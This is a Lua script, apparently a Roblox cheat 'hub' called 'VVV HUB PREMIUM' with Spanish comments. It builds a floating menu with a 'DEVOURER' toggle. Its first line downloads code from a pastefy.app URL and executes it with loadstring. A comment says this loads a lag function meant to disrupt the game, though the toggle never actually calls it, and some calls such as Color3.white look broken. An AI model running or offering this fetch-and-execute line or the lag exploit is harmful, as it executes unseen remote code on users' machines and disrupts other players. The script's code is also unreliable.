-- Cargamos el motor de Miranda primero
loadstring(game:HttpGet("https://pastefy.app/JJVhs3rK/raw"))()

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

-- 1. LIMPIEZA
for _, gui in pairs(CoreGui:GetChildren()) do
    if gui.Name == "VvvHubBlueUI" then gui:Destroy() end
end

-- 2. INTERFAZ AZUL (VVV HUB STYLE)
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "VvvHubBlueUI"

-- Botón Flotante con tu Imagen de VVV HUB
local FloatingBtn = Instance.new("ImageButton", ScreenGui)
FloatingBtn.Size = UDim2.new(0, 55, 0, 55)
FloatingBtn.Position = UDim2.new(0, 15, 0.5, -27)
FloatingBtn.Image = "rbxassetid://1000178176" -- Tu imagen VVV HUB
FloatingBtn.BackgroundColor3 = Color3.fromRGB(0, 10, 30)
FloatingBtn.BorderColor3 = Color3.fromRGB(0, 170, 255)
FloatingBtn.BorderSizePixel = 2
FloatingBtn.Active = true
FloatingBtn.Draggable = true --

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 260, 0, 170)
MainFrame.Position = UDim2.new(0.5, -130, 0.4, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 5, 20)
MainFrame.BorderColor3 = Color3.fromRGB(0, 170, 255) -- AZUL NEÓN
MainFrame.BorderSizePixel = 4
MainFrame.Visible = false
MainFrame.Active = true
MainFrame.Draggable = true 

local Title = Instance.new("TextLabel", MainFrame)
Title.Text = "VVV HUB PREMIUM"
Title.Size = UDim2.new(1, 0, 0, 40)
Title.TextColor3 = Color3.fromRGB(0, 200, 255)
Title.BackgroundTransparency = 1
Title.TextSize = 24
Title.Font = Enum.Font.FredokaOne

local DevourButton = Instance.new("TextButton", MainFrame)
DevourButton.Size = UDim2.new(0.85, 0, 0.45, 0)
DevourButton.Position = UDim2.new(0.075, 0, 0.4, 0)
DevourButton.BackgroundColor3 = Color3.fromRGB(0, 40, 80)
DevourButton.Text = "DEVOURER: OFF" --
DevourButton.TextColor3 = Color3.white
DevourButton.TextSize = 18
DevourButton.Font = Enum.Font.SourceSansBold

-- 3. INTERACCIÓN
FloatingBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

local active = false
DevourButton.MouseButton1Click:Connect(function()
    active = not active
    if active then
        DevourButton.Text = "DEVOURER: ON" --
        DevourButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
        DevourButton.TextColor3 = Color3.new(0, 0, 0)
        -- Aquí se ejecuta la función de lag de Miranda ya cargada
    else
        DevourButton.Text = "DEVOURER: OFF" --
        DevourButton.BackgroundColor3 = Color3.fromRGB(0, 40, 80)
        DevourButton.TextColor3 = Color3.white
    end
end)
